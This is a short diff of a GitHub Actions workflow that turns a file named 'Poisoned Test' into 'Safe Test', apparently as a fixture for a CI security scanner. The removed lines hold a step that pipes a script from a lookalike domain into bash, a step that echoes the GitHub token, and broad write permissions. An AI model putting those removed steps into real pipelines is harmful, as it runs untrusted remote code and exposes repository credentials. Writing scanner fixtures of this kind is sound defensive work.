@@ -1,21 +1,19 @@
-name: Poisoned Test
+name: Safe Test
 
 on:
   push:
-  
+  pull_request:
+
 permissions:
-  contents: write
-  actions: write
+  contents: read
 
 jobs:
   test:
     runs-on: ubuntu-latest
 
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout
+        uses: actions/checkout@v4
 
-      - name: Suspicious download
-        run: curl https://gihhu.com/script.sh | bash
-
-      - name: Secret access
-        run: echo $GITHUB_TOKEN
+      - name: Run safe test
+        run: echo "Security scanner safe-test"
